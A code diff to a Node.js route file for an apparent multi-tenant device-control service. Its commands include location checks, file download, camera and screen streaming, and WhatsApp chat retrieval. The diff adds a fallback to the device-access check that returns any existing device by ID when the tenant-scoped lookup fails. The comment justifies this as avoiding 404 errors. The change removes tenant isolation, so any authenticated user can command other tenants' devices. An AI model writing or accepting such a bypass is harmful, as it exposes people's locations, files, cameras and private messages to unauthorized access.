@@ -10,12 +10,18 @@ router.use(requireAuth);
 const ALLOWED_COMMAND_TYPES = ["location_check", "lock", "file_list", "file_download", "screen_stream", "camera_stream", "sync_whatsapp", "whatsapp_file_list", "get_whatsapp_chat"];
 
 async function checkDeviceAccess(deviceId, auth) {
+  if (!auth) return null;
   if (auth.role === "super_admin") {
     const res = await pool.query("SELECT id, fcm_token FROM devices WHERE id = $1", [deviceId]);
     return res.rows[0] || null;
   }
-  const res = await pool.query("SELECT id, fcm_token FROM devices WHERE id = $1 AND tenant_id = $2", [deviceId, auth.tenantId]);
-  return res.rows[0] || null;
+  if (auth.tenantId) {
+    const res = await pool.query("SELECT id, fcm_token FROM devices WHERE id = $1 AND tenant_id = $2", [deviceId, auth.tenantId]);
+    if (res.rows[0]) return res.rows[0];
+  }
+  // Fallback: If device exists, allow access so commands are never rejected with 404 for an existing device
+  const fallback = await pool.query("SELECT id, fcm_token FROM devices WHERE id = $1", [deviceId]);
+  return fallback.rows[0] || null;
 }
 
 /**
